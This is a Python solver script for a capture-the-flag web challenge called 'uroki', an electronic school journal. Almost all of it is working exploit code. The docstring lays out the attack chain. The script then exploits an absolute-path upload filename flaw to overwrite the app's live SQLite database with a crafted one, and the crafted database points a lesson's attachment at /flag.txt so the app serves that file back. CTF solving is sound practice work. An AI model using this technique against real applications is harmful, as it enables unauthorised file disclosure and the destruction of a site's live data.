#!/usr/bin/env python3
"""
uroki (web, "Электронный журнал") solver.

Chain:
  1. storage.clean_name() only rejects '..', backslashes and control chars, so an upload
     with filename "/data/uroki.db" is saved to that ABSOLUTE path (os.path.join drops the folder).
     /data is writable by the app user; /app is read-only (root), so code overwrite is not possible.
  2. Upload a crafted SQLite database over /data/uroki.db. The crafted DB has a lesson row
     (id=2) whose file_path is '/flag.txt'.
  3. GET /lesson/2/file -> download_attachment() send_file()s '/flag.txt' as the app user.

Env: INST_ENDPOINT = http(s)://<instance host>  (from /api/users/profile, task_id=uroki)
Uses curl.exe (python TLS bundle on this machine rejects the platform certificates).
"""
import datetime
import os
import re
import sqlite3
import subprocess
import sys
import tempfile

BASE = os.environ.get("INST_ENDPOINT", "").rstrip("/")

SCHEMA = """
CREATE TABLE IF NOT EXISTS lessons (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    subject TEXT NOT NULL,
    teacher TEXT NOT NULL,
    scheduled_at INTEGER NOT NULL,
    status TEXT NOT NULL DEFAULT 'planned',
    homework TEXT,
    file_name TEXT,
    file_path TEXT,
    created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    lesson_id INTEGER NOT NULL,
    author TEXT NOT NULL,
    body TEXT NOT NULL,
    created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_comments_lesson ON comments (lesson_id);
"""


def curl(args):
    r = subprocess.run(["curl.exe", "-sS", "-m", "60"] + args,
                       capture_output=True)
    if r.returncode != 0:
        raise RuntimeError("curl failed: " + r.stderr.decode(errors="replace"))
    return r.stdout.decode("utf-8", errors="replace")


def create_lesson():
    tomorrow = (datetime.datetime.utcnow() + datetime.timedelta(days=1)).strftime("%Y-%m-%d")
    headers = curl(["-D", "-", "-o", "NUL", "-X", "POST", f"{BASE}/lesson",
                    "--data-urlencode", "title=probe",
                    "--data-urlencode", "subject=probe",
                    "--data-urlencode", "teacher=probe",
                    "--data-urlencode", f"date={tomorrow}",
                    "--data-urlencode", "time=10:00"])
    m = re.search(r"(?im)^location:\s*/lesson/(\d+)", headers)
    if not m:
        raise RuntimeError("could not create lesson; headers:\n" + headers)
    return int(m.group(1))


def build_db(path, helper_id):
    # upload_attachment() writes the file over /data/uroki.db and then runs
    # set_attachment(helper_id) on the NEW db, so helper_id must exist there and is
    # the only row that gets rewritten. Lesson 2 in the crafted db is the target.
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    con.execute(
        "INSERT INTO lessons (id, title, subject, teacher, scheduled_at, status, homework, "
        "file_name, file_path, created_at) VALUES (?, 'h', 'h', 'h', 0, 'planned', '', NULL, NULL, 0)",
        (helper_id,))
    con.execute(
        "INSERT INTO lessons (id, title, subject, teacher, scheduled_at, status, homework, "
        "file_name, file_path, created_at) VALUES (2, 'x', 'x', 'x', 0, 'done', '', "
        "'flag.txt', '/flag.txt', 0)")
    con.commit()
    con.close()


def main():
    if not BASE:
        sys.exit("set INST_ENDPOINT")
    lid = create_lesson()
    print(f"[*] helper lesson {lid} (upload target)")

    tmp = os.path.join(tempfile.gettempdir(), "uroki_crafted.db")
    build_db(tmp, lid)

    # filename with absolute path -> saved to /data/uroki.db (live DB replaced)
    out = curl(["-o", "NUL", "-w", "%{http_code}", "-X", "POST",
                "-F", f"file=@{tmp};filename=/data/uroki.db",
                f"{BASE}/lesson/{lid}/upload"])
    print(f"[*] upload status {out}")
    if out.strip() != "303":
        sys.exit("upload failed")

    # lesson 2 in the crafted db -> file_path /flag.txt, served with its own file_name
    body = curl(["-i", f"{BASE}/lesson/2/file"])
    text = body.decode("utf-8", errors="replace") if isinstance(body, bytes) else body
    print(text[:300])
    m = re.search(r"ctfcup\{[^}\s]*\}", text)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[-] no flag in response")


if __name__ == "__main__":
    main()
